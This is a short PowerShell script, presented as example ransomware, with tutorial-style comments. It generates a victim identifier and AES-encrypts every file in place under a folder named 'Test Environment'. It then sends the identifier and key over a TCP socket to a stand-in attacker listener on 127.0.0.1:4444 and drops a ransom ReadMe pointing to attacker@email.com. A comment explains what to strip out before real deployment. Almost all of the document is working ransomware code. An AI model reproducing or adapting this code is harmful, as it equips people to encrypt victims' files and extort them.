# With ransomware, we want to accomplish 3 things:
#
# 1. Create a unique identifier for the victim, 
#    to match with ID to key.
#
# 2. Encrypt all files possible.
#
# 3. Send the attacker the ID and key.

# I want my ID in a XXXX-XXXX-XXXX-XXXX
# format. I found this solution elegant enough.

$VictimIdentifier                       = @()
$Pool                                   = (48..57) + (65..90)

foreach ($CharacterIndex in 1..23)
{
    if ($CharacterIndex % 6)
    {
        $Character                      = [Char] ($Pool | Get-Random)
    }
    else
    {
        $Character                      = "-"
    }
    
    $VictimIdentifier                  += $Character
}

$VictimIdentifier                       = -join $VictimIdentifier
$VictimIdentifierBytes                  = $VictimIdentifier.ToCharArray() | ForEach-Object { [Byte] $_ }

# AES is absolutely the strongest encryption
# schema available to us. Because this is only an
# example, we will not be using a unique key.

# When you create the AES service provider, it
# generates a random key and initialization vector.

$Aes                                    = [Security.Cryptography.AesCryptoServiceProvider]::New()

# If you wish to deploy this ransomeware
# be sure NOT to include the following.

$AesKey                                 = "DO-NOT-RUN-DO-NOT-RUN-DO-NOT-RUN"
$AesIV                                  = "VOX-TUA-SILENTIS"

$AesKey                                 = $AesKey.ToCharArray() | ForEach-Object { [Byte] $_ }
$AesIV                                  = $AesIV.ToCharArray()  | ForEach-Object { [Byte] $_ }

$Aes.Key                                = $AesKey
$Aes.IV                                 = $AesIV

# Now create the encryptor with your AES service
# provider. This will create an encryptor using
# the set key or iv if else was provided.

$Encryptor                              = $Aes.CreateEncryptor()

# We need a function to encrypt files given the
# location, then write them to that location.

function Encrypt-File ($File)
{
    # Read File
    $FileBytes                          = [IO.File]::ReadAllBytes($File)

    # Encrypt File
    $CipherText                         = $Encryptor.TransformFinalBlock($FileBytes, 0, $FileBytes.length)
    $EncryptedFileBytes                 = $Aes.IV + $CipherText

    # Write File
    [IO.File]::WriteAllBytes($File, $EncryptedFileBytes)
}

# This is only an example ransomware, we want to
# only encrypt files within our environment.

$Files                                  = Get-ChildItem "Test Environment" -Force -Recurse -File

foreach ($File in $Files.FullName)
{
    Encrypt-File $File
}

# Send the attacker our id and key.

$Attacker                               = [Net.Sockets.TcpClient]::New("127.0.0.1", 4444)
$Stream                                 = $Attacker.GetStream()

$Stream.Write($VictimIdentifierBytes, 0, $VictimIdentifierBytes.Length)
$Stream.Write($Aes.Key,               0, $Aes.Key.Length)

$Attacker.Close()

"Email the following email address [attacker@email.com] with the identifier [$VictimIdentifier] to receive more information." > ReadMe.txt
